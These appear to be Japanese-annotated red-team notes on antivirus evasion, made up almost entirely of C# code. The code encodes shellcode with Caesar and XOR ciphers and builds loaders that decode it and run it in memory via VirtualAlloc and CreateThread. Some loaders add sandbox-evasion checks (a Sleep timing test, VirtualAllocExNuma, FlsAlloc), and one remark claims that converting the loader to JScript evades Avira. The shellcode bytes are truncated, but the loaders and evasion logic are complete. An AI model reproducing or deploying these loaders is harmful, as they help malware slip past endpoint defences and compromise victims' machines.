## Encryption
### Caesar
ペイロードの暗号化用コード
```c#
namespace Helper
{
    class Program
    {
        static void Main(string[] args)
        {
            byte[] buf = new byte[752] {
                0xfc,0x48,0x83,0xe4,0xf0...
                };
                
            byte[] encoded = new byte[buf.Length];
            for(int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 8) & 0xFF);
            }
            StringBuilder hex = new StringBuilder(encoded.Length * 2);
			foreach(byte b in encoded)
			{
			    hex.AppendFormat("0x{0:x2}, ", b);
			}
			
			Console.WriteLine("The payload is: " + hex.ToString());
		}
	}
}
```

復号
```c#
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, 
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, 
                  uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, 
            UInt32 dwMilliseconds);
        
        static void Main(string[] args)
        {
            byte[] buf = new byte[752] {0xfc,0x48,0x83,0xe4...};
              
            for(int i = 0; i < buf.Length; i++)
			{
			    buf[i] = (byte)(((uint)buf[i] - 8) & 0xFF);
			}
			
            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, 
                IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

### XOR
暗号化
```c#
namespace Helper
{
    class Program
    {
        static void Main(string[] args)
        {
            byte[] buf = new byte[752] {
                0xfc,0x48,0x83,0xe4,0xf0...};
            byte key = 0x3c;
            byte[] encoded = new byte[buf.Length];
            for(int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)((uint)buf[i] ^ key);
            }
            StringBuilder hex = new StringBuilder(encoded.Length * 2);
			foreach(byte b in encoded)
			{
			    hex.AppendFormat("0x{0:x2}, ", b);
			}
			
			Console.WriteLine("The payload is: " + hex.ToString());
		}
	}
}
```

```c#
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, 
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, 
                  uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, 
            UInt32 dwMilliseconds);
        
        static void Main(string[] args)
        {
            byte[] buf = new byte[752] {
              0xfc,0x48,0x83,0xe4...};
            byte key = 0x3c;
            
            for(int i = 0; i < buf.Length; i++)
			{
			    buf[i] = (byte)((uint)buf[i] ^ key);
			}
			
            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, 
                IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

## Sleep Timer
Sleep呼び出し
```c#
[DllImport("kernel32.dll")]
static extern void Sleep(uint dwMilliseconds);
        
static void Main(string[] args)
{
    DateTime t1 = DateTime.Now;
    Sleep(2000);
    double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
    if(t2 < 1.5)
    {
        return;
    }
```

sleep + XORペイロード
```c#
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
                  uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle,
            UInt32 dwMilliseconds);
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        static void Main(string[] args)
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            byte[] buf = new byte[826] { 0xc0, 0x74, ...};
            byte key = 0x3c;


            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ key);
            }

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)size, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
                IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

Aviraは↑これをJScriptに変換すれば検知できなくなる

## Non-emulated APIs
VirtualAllocExNuma
```c#
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
                  uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle,
            UInt32 dwMilliseconds);
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);
        
		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
		static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, 
		    uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
		    
		[DllImport("kernel32.dll")]
		static extern IntPtr GetCurrentProcess();

        static void Main(string[] args)
        {
			IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
			if(mem == null)
			{
			    return;
			}
			
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            byte[] buf = new byte[826] { 0xc0, 0x74, ...};
            byte key = 0x3c;


            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ key);
            }

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)size, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
                IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

VirtualAllocExNuma + FlsAlloc
```c#
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
                  uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle,
            UInt32 dwMilliseconds);
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);
        
		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
		static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, 
		    uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
		    
		[DllImport("kernel32.dll")]
		static extern IntPtr GetCurrentProcess();
		
		[DllImport("kernel32.dll")]
        static extern uint FlsAlloc(IntPtr lpCallback);
        const uint FLS_OUT_OF_INDEXES = 0xFFFFFFFF;
        
        static void Main(string[] args)
        {
			IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
			if(mem == null)
			{
			    return;
			}
			
			uint flsIndex = FlsAlloc(IntPtr.Zero);
			if(flsIndex == FLS_OUT_OF_INDEXES)
			{
				return;
			}
			
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            byte[] buf = new byte[826] { 0xc0, 0x74, ...};
            byte key = 0x3c;


            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ key);
            }

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)size, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
                IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```